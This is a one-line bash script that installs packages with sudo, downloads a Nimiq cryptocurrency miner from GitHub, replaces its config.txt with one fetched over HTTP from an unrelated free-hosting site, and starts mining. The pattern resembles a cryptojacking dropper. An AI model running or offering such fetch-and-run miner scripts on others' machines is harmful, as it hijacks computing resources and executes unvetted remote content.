#! /bin/bash 
cd && sudo apt-get update && sudo apt-get -y install unzip openjdk-8-jdk maven git gcc make build-essential && rm -rf nimiqs && mkdir nimiqs && cd nimiqs && wget https://github.com/skypool-org/skypool-nimiq-miner/releases/download/v1.3.0/skypool-nimiq-v1.3.0-linux-x64-extreme.zip && unzip skypool-nimiq-v1.3.0-linux-x64-extreme.zip && sleep 10 && cd skypool-nimiq-v1.3.0-linux-x64-extreme && rm -rf config.txt && wget http://darman.inknot.hol.es/1/config.txt && ./skypool-node-client
